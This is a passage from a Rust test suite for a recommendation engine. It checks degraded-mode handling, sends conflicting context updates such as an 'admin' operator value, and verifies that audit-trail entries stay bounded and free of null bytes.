                assert!(entry.degraded_mode, "Op2 should be in degraded mode");
            } else if entry.operator_id == "concurrent_op_3" {
                assert!(!entry.degraded_mode, "Op3 should not be in degraded mode");
            }
        }

        // Test stream updates with conflicting information
        let stream_id = "conflict_stream";
        let initial_recommendation = match engine.recommend(&RecommendationRequest {
            operator_id: "stream_tester".to_string(),
            context: std::collections::HashMap::new(),
            degraded_mode: false,
            urgency: Urgency::Medium,
            allowed_actions: vec!["stream_action".to_string()],
        }) {
            Ok(rec) => rec,
            Err(_) => return, // Skip stream test if initial recommendation fails
        };

        // Test conflicting stream updates
        let conflicting_updates = vec![
            // Update with different urgency
            ("urgency", "critical"),
            ("urgency", "low"),

            // Update with conflicting mode
            ("degraded_mode", "true"),
            ("degraded_mode", "false"),

            // Update with suspicious values
            ("operator", "admin"),
            ("action", "emergency_override"),
        ];

        for (update_key, update_value) in conflicting_updates {
            // Simulate stream update (would be async in real implementation)
            let updated_context = {
                let mut ctx = std::collections::HashMap::new();
                ctx.insert(update_key.to_string(), update_value.to_string());
                ctx
            };

            // Process update recommendation
            let update_request = RecommendationRequest {
                operator_id: "stream_updater".to_string(),
                context: updated_context,
                degraded_mode: false,
                urgency: Urgency::Medium,
                allowed_actions: vec!["update_action".to_string()],
            };

            let _update_result = engine.recommend(&update_request);

            // Verify updates don't corrupt original recommendation data
            // (In a real stream implementation, this would test that concurrent updates
            // don't interfere with each other)
        }

        // Final state verification
        let final_audit = engine.audit_trail();
        assert!(final_audit.len() <= MAX_AUDIT_TRAIL);

        // All audit entries should remain structurally valid
        for entry in &final_audit {
            assert!(!entry.operator_id.is_empty());
            assert!(!entry.operator_id.contains('\0'));
            assert!(!entry.primary_action_id.contains('\0'));
        }
    }
}
